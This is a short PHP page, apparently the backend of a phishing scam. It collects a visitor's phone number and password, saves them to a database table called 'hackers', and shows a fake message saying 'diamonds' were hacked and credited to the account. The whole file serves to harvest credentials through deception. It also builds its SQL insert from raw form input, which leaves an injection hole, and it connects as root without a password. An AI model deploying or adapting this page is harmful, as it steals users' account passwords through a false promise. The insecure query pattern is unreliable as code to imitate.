<?php
	$pno=$_POST['pno'];
	$password=$_POST['password'];
	$con=mysqli_connect('localhost','root');
	mysqli_select_db($con,'hack');
	$q="INSERT INTO hackers (contact,password) values ('$pno','$password')";
	$status=mysqli_query($con,$q);
        mysqli_close($con);	
 ?>

<!DOCTYPE html>
<html>
<head>
<title>Hacked!</title>
<style type="text/css">
	body {
	font-weight:bold;
	color:red;
</style>
</head>
<body bgcolor="orange">
<h2>Hackers!</h2>
<p><?php
$x=rand(10000,9999999);
if($status==1)
echo "Dear user Diamonds hacked successfully, $x  Diamonds credited in your account successfully!";
else
echo "Hacking failed ,try again";
?>
</p>
</body>
</html>